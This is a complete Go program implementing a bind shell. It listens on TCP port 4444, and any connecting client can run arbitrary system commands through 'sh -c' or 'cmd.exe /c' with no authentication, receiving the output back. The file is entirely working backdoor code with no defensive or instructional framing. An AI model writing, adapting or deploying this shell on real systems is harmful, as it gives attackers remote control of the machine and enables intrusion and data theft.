package main

import (
        "bufio"
        "fmt"
        "log"
        "net"
        "os"
        "os/exec"
        "runtime"
        "strings"
)

const os_version string = runtime.GOOS

func main() {
        serv, err := net.Listen("tcp", ":4444")
        if err != nil {
                log.Fatal(err)
        }
        defer serv.Close()
        conn, err := serv.Accept()
        if err != nil {
                fmt.Println("Error: ", err)
        }
        defer conn.Close()
        for {
                func(c net.Conn) {
                        message, err := bufio.NewReader(c).ReadString('\n')
                        if err != nil {
                                fmt.Println("Error: ", err)
                        }
                        results := exec_cmd(message)
                        c.Write(results)
                }(conn)
        }
}

func exec_cmd(cmd string) []byte {
        parts := strings.Fields(cmd)
        head := parts[0]
        parts = parts[1:len(parts)]
        switch head {
        case "exit":
                os.Exit(0)
        case "cd":
                os.Chdir(parts[0])
                return []byte("dir chaged")
        default:
                //out, err := exec.Command(head, parts...).Output()
                if os_version != "windows" {
                        out, err := exec.Command("sh", "-c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                } else {
                        out, err := exec.Command("cmd.exe", "/c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                }
        }
        return nil
}
